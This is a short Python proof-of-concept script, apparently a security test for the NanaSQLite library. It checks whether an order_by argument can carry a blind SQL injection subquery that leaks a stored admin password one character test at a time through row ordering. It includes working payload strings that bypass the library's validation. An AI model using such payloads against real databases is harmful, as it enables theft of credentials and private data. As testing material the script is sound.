from nanasqlite.core import NanaSQLite


def main():
    db = NanaSQLite(":memory:", strict_sql_validation=True)
    db.create_table("users", {"id": "INTEGER", "name": "TEXT"})
    db.create_table("secrets", {"key": "TEXT", "value": "TEXT"})

    db.sql_insert("users", {"id": 1, "name": "Alice"})
    db.sql_insert("users", {"id": 2, "name": "Bob"})

    db.sql_insert("secrets", {"key": "admin_pass", "value": "supersecret"})

    # Malicious order_by using a subquery that doesn't look like a function call
    # If admin_pass starts with 's', it returns 1, else NULL.
    # We use COALESCE (allowed) to handle the NULL.
    # If it's 's*', order becomes id * 1, else id * 10 (changes order)
    malicious_order_by = "id * COALESCE((SELECT 1 FROM secrets WHERE value GLOB 's*'), 10)"

    print(f"Executing query with order_by='{malicious_order_by}'")
    try:
        results = db.query_with_pagination("users", order_by=malicious_order_by)
        print("Results:")
        for r in results:
            print(r)

        if results and results[0]["id"] == 1:
            # wait, if id GLOB 's*' is True, it returns 1, so id*1.
            # 1*1 = 1, 2*1 = 2. Order: 1, 2.
            # If False, returns 10, so id*10.
            # Wait, this doesn't change order.

            # Let's use id * -1 if True.
            malicious_order_by = "id * COALESCE((SELECT -1 FROM secrets WHERE value GLOB 's*'), 1)"
            results = db.query_with_pagination("users", order_by=malicious_order_by)
            if results and results[0]["id"] == 2: # id 2 * -1 = -2, id 1 * -1 = -1. Order: 2, 1.
                print("[!] VULNERABILITY CONFIRMED: Blind SQLi was successful (data extracted via order).")
            else:
                print("[-] SAFE or not working.")
        else:
            print("[-] SAFE or not working.")
    except Exception as e:
        print(f"Exception: {e}")

if __name__ == "__main__":
    main()
